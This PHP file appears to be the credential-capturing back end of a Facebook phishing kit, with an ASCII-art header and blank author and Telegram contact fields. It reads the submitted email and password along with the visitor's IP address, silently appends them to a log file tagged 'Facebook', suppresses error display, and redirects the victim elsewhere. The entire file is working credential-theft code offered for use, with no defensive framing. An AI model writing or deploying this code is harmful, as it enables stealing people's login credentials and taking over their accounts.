<?php
/*--  a vampire ~ 9/96:
              __.......__
            .-:::::::::::::-.
          .:::''':::::::''':::.
        .:::'     `:::'     `:::. 
   .'\  ::'   ^^^  `:'  ^^^   '::  /`.
  :   \ ::   _.__       __._   :: /   ;
 :     \`: .' ___\     /___ `. :'/     ; 
:       /\   (_|_)\   /(_|_)   /\       ;
:      / .\   __.' ) ( `.__   /. \      ;
:      \ (        {   }        ) /      ; 
 :      `-(     .  ^"^  .     )-'      ;
  `.       \  .'<`-._.-'>'.  /       .'
    `.      \    \;`.';/    /      .'
 jgs  `._    `-._       _.-'    _.'
       .'`-.__ .'`-._.-'`. __.-'`.
     .'       `.         .'       `.
   .'           `-.   .-'           `.
------------------------------------------------------------    
Author   : 
Telegram : 
------------------------------------------------------------*/
error_reporting(0);
ini_set('display_errors', 0);
require_once '../config.php';
if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
  } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
  } else {
    $ipaddress = $_SERVER['REMOTE_ADDR'];
  }

$a1 = $_POST['email'];
$b1 = $_POST['password'];

$datas = "==11{$ipaddress}== ==12Facebook== ==13{$a1}== ==14{$b1}==";

$sendhits = "../../log.txt";
$x = fopen($sendhits, "a+");
fwrite($x, $datas);
fclose($x);
header('Location: '.$RedirectUrl);
?>
